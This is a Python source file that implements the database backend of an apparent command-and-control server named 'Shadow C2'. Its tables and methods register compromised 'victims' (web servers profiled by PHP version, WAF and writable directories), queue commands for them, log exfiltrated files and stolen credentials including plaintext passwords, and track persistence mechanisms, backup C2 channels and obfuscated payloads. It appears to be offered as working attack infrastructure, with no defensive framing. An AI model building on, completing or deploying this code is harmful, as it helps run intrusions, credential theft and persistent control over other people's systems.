#!/usr/bin/env python3
"""
Shadow C2 — SQLite Database Layer
Thread-safe, full CRUD, connection-per-thread via threading.local().
"""

import sqlite3
import threading
import json
import time
from datetime import datetime, timezone

from server.config import DATABASE_PATH


class DatabaseManager:
    """Thread-safe SQLite database manager with connection pooling."""

    def __init__(self, db_path: str = DATABASE_PATH):
        self.db_path = db_path
        self._local = threading.local()
        self._lock = threading.Lock()

    # -- connection management -----------------------------------------------

    def _get_conn(self) -> sqlite3.Connection:
        if not hasattr(self._local, "conn") or self._local.conn is None:
            conn = sqlite3.connect(self.db_path, check_same_thread=False)
            conn.row_factory = sqlite3.Row
            conn.execute("PRAGMA journal_mode=WAL")
            conn.execute("PRAGMA foreign_keys=ON")
            self._local.conn = conn
        return self._local.conn

    @property
    def conn(self):
        return self._get_conn()

    def close(self):
        if hasattr(self._local, "conn") and self._local.conn:
            self._local.conn.close()
            self._local.conn = None

    # -- schema --------------------------------------------------------------

    def init_db(self):
        """Create all tables and indexes."""
        with self._lock:
            c = self.conn
            c.executescript("""
                CREATE TABLE IF NOT EXISTS victims (
                    id              INTEGER PRIMARY KEY AUTOINCREMENT,
                    uuid            TEXT    UNIQUE NOT NULL,
                    ip              TEXT,
                    hostname        TEXT,
                    os              TEXT,
                    arch            TEXT,
                    php_version     TEXT,
                    server_software TEXT,
                    cms_detected    TEXT,
                    waf_detected    TEXT,
                    document_root   TEXT,
                    writable_dirs   TEXT,
                    disabled_functions TEXT,
                    latitude        REAL,
                    longitude       REAL,
                    country         TEXT,
                    city            TEXT,
                    first_seen      TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_seen       TIMESTAMP,
                    status          TEXT DEFAULT 'active'
                                    CHECK(status IN ('active','dormant','dead')),
                    tags            TEXT DEFAULT '',
                    notes           TEXT DEFAULT ''
                );
                CREATE INDEX IF NOT EXISTS idx_victims_uuid   ON victims(uuid);
                CREATE INDEX IF NOT EXISTS idx_victims_status ON victims(status);

                CREATE TABLE IF NOT EXISTS commands (
                    id              INTEGER PRIMARY KEY AUTOINCREMENT,
                    victim_id       INTEGER NOT NULL REFERENCES victims(id) ON DELETE CASCADE,
                    command_text    TEXT    NOT NULL,
                    response_text   TEXT,
                    status          TEXT DEFAULT 'pending'
                                    CHECK(status IN ('pending','sent','completed','failed','timeout')),
                    created_at      TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    sent_at         TIMESTAMP,
                    completed_at    TIMESTAMP
                );
                CREATE INDEX IF NOT EXISTS idx_commands_victim ON commands(victim_id);
                CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status);

                CREATE TABLE IF NOT EXISTS files (
                    id              INTEGER PRIMARY KEY AUTOINCREMENT,
                    victim_id       INTEGER NOT NULL REFERENCES victims(id) ON DELETE CASCADE,
                    local_path      TEXT,
                    remote_path     TEXT,
                    filename        TEXT,
                    size            INTEGER,
                    sha256          TEXT,
                    direction       TEXT CHECK(direction IN ('upload','download')),
                    status          TEXT DEFAULT 'pending',
                    created_at      TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );

                CREATE TABLE IF NOT EXISTS credentials (
                    id              INTEGER PRIMARY KEY AUTOINCREMENT,
                    victim_id       INTEGER NOT NULL REFERENCES victims(id) ON DELETE CASCADE,
                    service         TEXT,
                    host            TEXT,
                    port            INTEGER,
                    username        TEXT,
                    password        TEXT,
                    database_name   TEXT,
                    found_at        TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
                CREATE INDEX IF NOT EXISTS idx_creds_victim ON credentials(victim_id);

                CREATE TABLE IF NOT EXISTS persistence (
                    id              INTEGER PRIMARY KEY AUTOINCREMENT,
                    victim_id       INTEGER NOT NULL REFERENCES victims(id) ON DELETE CASCADE,
                    method          TEXT,
                    details         TEXT,
                    status          TEXT DEFAULT 'installed',
                    installed_at    TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );

                CREATE TABLE IF NOT EXISTS c2_channels (
                    id              INTEGER PRIMARY KEY AUTOINCREMENT,
                    victim_id       INTEGER NOT NULL REFERENCES victims(id) ON DELETE CASCADE,
                    channel_type    TEXT,
                    endpoint        TEXT,
                    priority        INTEGER DEFAULT 0,
                    status          TEXT DEFAULT 'active',
                    last_used       TIMESTAMP
                );

                CREATE TABLE IF NOT EXISTS logs (
                    id              INTEGER PRIMARY KEY AUTOINCREMENT,
                    action          TEXT,
                    details         TEXT,
                    ip              TEXT,
                    timestamp       TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );

                CREATE TABLE IF NOT EXISTS generated_payloads (
                    id              INTEGER PRIMARY KEY AUTOINCREMENT,
                    filename        TEXT,
                    payload_type    TEXT,
                    encoding_layers TEXT,
                    obfuscation_method TEXT,
                    waf_bypasses    TEXT,
                    target_info     TEXT,
                    sha256          TEXT,
                    size            INTEGER,
                    generated_at    TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
            """)
            c.commit()

    # -- helpers -------------------------------------------------------------

    def _now(self) -> str:
        return datetime.now(timezone.utc).isoformat()

    def _row_to_dict(self, row) -> dict:
        if row is None:
            return None
        return dict(row)

    def _rows_to_list(self, rows) -> list:
        return [dict(r) for r in rows]

    # -- victims -------------------------------------------------------------

    def add_victim(self, uuid: str, ip: str = "", hostname: str = "",
                   os_name: str = "", arch: str = "", php_version: str = "",
                   server_software: str = "", document_root: str = "",
                   writable_dirs: str = "", disabled_functions: str = "",
                   cms_detected: str = "", waf_detected: str = "",
                   latitude: float = 0.0, longitude: float = 0.0,
                   country: str = "", city: str = "") -> int:
        now = self._now()
        with self._lock:
            cur = self.conn.execute("""
                INSERT OR REPLACE INTO victims
                (uuid, ip, hostname, os, arch, php_version, server_software,
                 document_root, writable_dirs, disabled_functions,
                 cms_detected, waf_detected, latitude, longitude, country, city,
                 first_seen, last_seen, status)
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,'active')
            """, (uuid, ip, hostname, os_name, arch, php_version,
                  server_software, document_root, writable_dirs,
                  disabled_functions, cms_detected, waf_detected,
                  latitude, longitude, country, city, now, now))
            self.conn.commit()
            return cur.lastrowid

    def update_victim(self, victim_id: int, **kwargs):
        if not kwargs:
            return
        allowed = {"ip", "hostname", "os", "arch", "php_version",
                    "server_software", "cms_detected", "waf_detected",
                    "document_root", "writable_dirs", "disabled_functions",
                    "latitude", "longitude", "country", "city",
                    "last_seen", "status", "tags", "notes"}
        fields = {k: v for k, v in kwargs.items() if k in allowed}
        if not fields:
            return
        set_clause = ", ".join(f"{k}=?" for k in fields)
        values = list(fields.values()) + [victim_id]
        with self._lock:
            self.conn.execute(f"UPDATE victims SET {set_clause} WHERE id=?", values)
            self.conn.commit()

    def update_victim_by_uuid(self, uuid: str, **kwargs):
        victim = self.get_victim_by_uuid(uuid)
        if victim:
            self.update_victim(victim["id"], **kwargs)

    def get_victim(self, victim_id: int) -> dict:
        row = self.conn.execute("SELECT * FROM victims WHERE id=?", (victim_id,)).fetchone()
        return self._row_to_dict(row)

    def get_victim_by_uuid(self, uuid: str) -> dict:
        row = self.conn.execute("SELECT * FROM victims WHERE uuid=?", (uuid,)).fetchone()
        return self._row_to_dict(row)

    def list_victims(self, status: str = None, tag: str = None) -> list:
        query = "SELECT * FROM victims"
        params = []
        conditions = []
        if status:
            conditions.append("status=?")
            params.append(status)
        if tag:
            conditions.append("tags LIKE ?")
            params.append(f"%{tag}%")
        if conditions:
            query += " WHERE " + " AND ".join(conditions)
        query += " ORDER BY last_seen DESC"
        return self._rows_to_list(self.conn.execute(query, params).fetchall())

    def delete_victim(self, victim_id: int):
        with self._lock:
            self.conn.execute("DELETE FROM victims WHERE id=?", (victim_id,))
            self.conn.commit()

    def touch_victim(self, uuid: str):
        """Update last_seen to now and set active."""
        with self._lock:
            self.conn.execute(
                "UPDATE victims SET last_seen=?, status='active' WHERE uuid=?",
                (self._now(), uuid))
            self.conn.commit()

    # -- commands ------------------------------------------------------------

    def add_command(self, victim_id: int, command_text: str) -> int:
        with self._lock:
            cur = self.conn.execute(
                "INSERT INTO commands (victim_id, command_text) VALUES (?,?)",
                (victim_id, command_text))
            self.conn.commit()
            return cur.lastrowid

    def get_pending_commands(self, victim_id: int) -> list:
        rows = self.conn.execute(
            "SELECT * FROM commands WHERE victim_id=? AND status='pending' ORDER BY created_at",
            (victim_id,)).fetchall()
        return self._rows_to_list(rows)

    def get_pending_commands_by_uuid(self, uuid: str) -> list:
        victim = self.get_victim_by_uuid(uuid)
        if not victim:
            return []
        return self.get_pending_commands(victim["id"])

    def update_command(self, cmd_id: int, status: str, response: str = None):
        with self._lock:
            if response is not None:
                self.conn.execute(
                    "UPDATE commands SET status=?, response_text=?, completed_at=? WHERE id=?",
                    (status, response, self._now(), cmd_id))
            else:
                self.conn.execute(
                    "UPDATE commands SET status=?, sent_at=? WHERE id=?",
                    (status, self._now(), cmd_id))
            self.conn.commit()

    def mark_commands_sent(self, cmd_ids: list):
        if not cmd_ids:
            return
        with self._lock:
            placeholders = ",".join("?" * len(cmd_ids))
            self.conn.execute(
                f"UPDATE commands SET status='sent', sent_at=? WHERE id IN ({placeholders})",
                [self._now()] + cmd_ids)
            self.conn.commit()

    def get_command_history(self, victim_id: int, limit: int = 100) -> list:
        rows = self.conn.execute(
            "SELECT * FROM commands WHERE victim_id=? ORDER BY created_at DESC LIMIT ?",
            (victim_id, limit)).fetchall()
        return self._rows_to_list(rows)

    # -- files ---------------------------------------------------------------

    def add_file(self, victim_id: int, filename: str, direction: str,
                 local_path: str = "", remote_path: str = "",
                 size: int = 0, sha256: str = "") -> int:
        with self._lock:
            cur = self.conn.execute("""
                INSERT INTO files (victim_id, filename, direction, local_path,
                                   remote_path, size, sha256, status)
                VALUES (?,?,?,?,?,?,?,'completed')
            """, (victim_id, filename, direction, local_path, remote_path, size, sha256))
            self.conn.commit()
            return cur.lastrowid

    def get_files(self, victim_id: int) -> list:
        rows = self.conn.execute(
            "SELECT * FROM files WHERE victim_id=? ORDER BY created_at DESC",
            (victim_id,)).fetchall()
        return self._rows_to_list(rows)

    # -- credentials ---------------------------------------------------------

    def add_credential(self, victim_id: int, service: str, host: str = "",
                       port: int = 0, username: str = "", password: str = "",
                       database_name: str = "") -> int:
        with self._lock:
            cur = self.conn.execute("""
                INSERT INTO credentials (victim_id, service, host, port,
                                         username, password, database_name)
                VALUES (?,?,?,?,?,?,?)
            """, (victim_id, service, host, port, username, password, database_name))
            self.conn.commit()
            return cur.lastrowid

    def get_credentials(self, victim_id: int = None) -> list:
        if victim_id:
            rows = self.conn.execute(
                "SELECT c.*, v.hostname, v.ip FROM credentials c JOIN victims v ON c.victim_id=v.id WHERE c.victim_id=? ORDER BY found_at DESC",
                (victim_id,)).fetchall()
        else:
            rows = self.conn.execute(
                "SELECT c.*, v.hostname, v.ip FROM credentials c JOIN victims v ON c.victim_id=v.id ORDER BY found_at DESC"
            ).fetchall()
        return self._rows_to_list(rows)

    # -- persistence ---------------------------------------------------------

    def add_persistence(self, victim_id: int, method: str, details: str = "",
                        status: str = "installed") -> int:
        with self._lock:
            cur = self.conn.execute(
                "INSERT INTO persistence (victim_id, method, details, status) VALUES (?,?,?,?)",
                (victim_id, method, details, status))
            self.conn.commit()
            return cur.lastrowid

    def get_persistence(self, victim_id: int) -> list:
        rows = self.conn.execute(
            "SELECT * FROM persistence WHERE victim_id=? ORDER BY installed_at DESC",
            (victim_id,)).fetchall()
        return self._rows_to_list(rows)

    # -- c2 channels ---------------------------------------------------------

    def add_c2_channel(self, victim_id: int, channel_type: str,
                       endpoint: str = "", priority: int = 0) -> int:
        with self._lock:
            cur = self.conn.execute(
                "INSERT INTO c2_channels (victim_id, channel_type, endpoint, priority) VALUES (?,?,?,?)",
                (victim_id, channel_type, endpoint, priority))
            self.conn.commit()
            return cur.lastrowid

    def get_c2_channels(self, victim_id: int) -> list:
        rows = self.conn.execute(
            "SELECT * FROM c2_channels WHERE victim_id=? ORDER BY priority",
            (victim_id,)).fetchall()
        return self._rows_to_list(rows)

    # -- logs ----------------------------------------------------------------

    def log_action(self, action: str, details: str = "", ip: str = ""):
        with self._lock:
            self.conn.execute(
                "INSERT INTO logs (action, details, ip) VALUES (?,?,?)",
                (action, details, ip))
            self.conn.commit()

    def get_logs(self, limit: int = 50) -> list:
        rows = self.conn.execute(
            "SELECT * FROM logs ORDER BY timestamp DESC LIMIT ?",
            (limit,)).fetchall()
        return self._rows_to_list(rows)

    # -- generated payloads --------------------------------------------------

    def add_generated_payload(self, filename: str, payload_type: str,
                              encoding_layers: str = "", obfuscation_method: str = "",
                              waf_bypasses: str = "", target_info: str = "",
                              sha256: str = "", size: int = 0) -> int:
        with self._lock:
            cur = self.conn.execute("""
                INSERT INTO generated_payloads
                (filename, payload_type, encoding_layers, obfuscation_method,
                 waf_bypasses, target_info, sha256, size)
                VALUES (?,?,?,?,?,?,?,?)
            """, (filename, payload_type, encoding_layers, obfuscation_method,
                  waf_bypasses, target_info, sha256, size))
            self.conn.commit()
            return cur.lastrowid

    def get_generated_payloads(self, limit: int = 50) -> list:
        rows = self.conn.execute(
            "SELECT * FROM generated_payloads ORDER BY generated_at DESC LIMIT ?",
            (limit,)).fetchall()
        return self._rows_to_list(rows)

    # -- stats ---------------------------------------------------------------

    def get_stats(self) -> dict:
        c = self.conn
        active = c.execute("SELECT COUNT(*) FROM victims WHERE status='active'").fetchone()[0]
        total_v = c.execute("SELECT COUNT(*) FROM victims").fetchone()[0]
        pending = c.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0]
        total_cmds = c.execute("SELECT COUNT(*) FROM commands").fetchone()[0]
        total_payloads = c.execute("SELECT COUNT(*) FROM generated_payloads").fetchone()[0]
        total_creds = c.execute("SELECT COUNT(*) FROM credentials").fetchone()[0]
        total_files = c.execute("SELECT COUNT(*) FROM files").fetchone()[0]
        return {
            "active_victims": active,
            "total_victims": total_v,
            "pending_commands": pending,
            "total_commands": total_cmds,
            "total_payloads": total_payloads,
            "total_credentials": total_creds,
            "total_files": total_files,
        }

    # -- maintenance ---------------------------------------------------------

    def cleanup_dead_victims(self, timeout_seconds: int = 7200):
        """Mark victims as dead if no beacon for timeout_seconds."""
        cutoff = datetime.now(timezone.utc).timestamp() - timeout_seconds
        cutoff_iso = datetime.fromtimestamp(cutoff, tz=timezone.utc).isoformat()
        with self._lock:
            self.conn.execute(
                "UPDATE victims SET status='dead' WHERE last_seen < ? AND status != 'dead'",
                (cutoff_iso,))
            dormant_cutoff = datetime.fromtimestamp(
                datetime.now(timezone.utc).timestamp() - timeout_seconds // 2,
                tz=timezone.utc).isoformat()
            self.conn.execute(
                "UPDATE victims SET status='dormant' WHERE last_seen < ? AND status = 'active'",
                (dormant_cutoff,))
            self.conn.commit()
